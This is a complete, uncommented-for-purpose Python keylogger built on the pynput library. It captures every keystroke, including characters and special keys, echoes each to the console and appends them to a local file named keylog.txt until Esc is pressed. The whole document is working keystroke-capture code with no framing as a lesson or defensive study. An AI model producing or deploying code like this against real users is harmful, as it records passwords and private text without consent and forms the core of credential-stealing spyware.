from pynput import keyboard

# This function is called when a key is pressed
def on_press(key):
    try:
        # If the key is a character, print it 
        if hasattr(key, 'char') and key.char is not None:
            print(f'Key pressed: {key.char}')
            with open("keylog.txt", "a") as log:
                log.write(key.char)
        else:
            # For special keys like Alt, Tab, etc.
            print(f'Special key pressed: {key}')
            with open("keylog.txt", "a") as log:
                log.write(f'[{key}]')
    except Exception as e:
        print(f'Error getting char: {e}')

# This function is called when a key is released
def on_release(key):
    # Stop listener when 'esc' is pressed
    if key == keyboard.Key.esc:
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
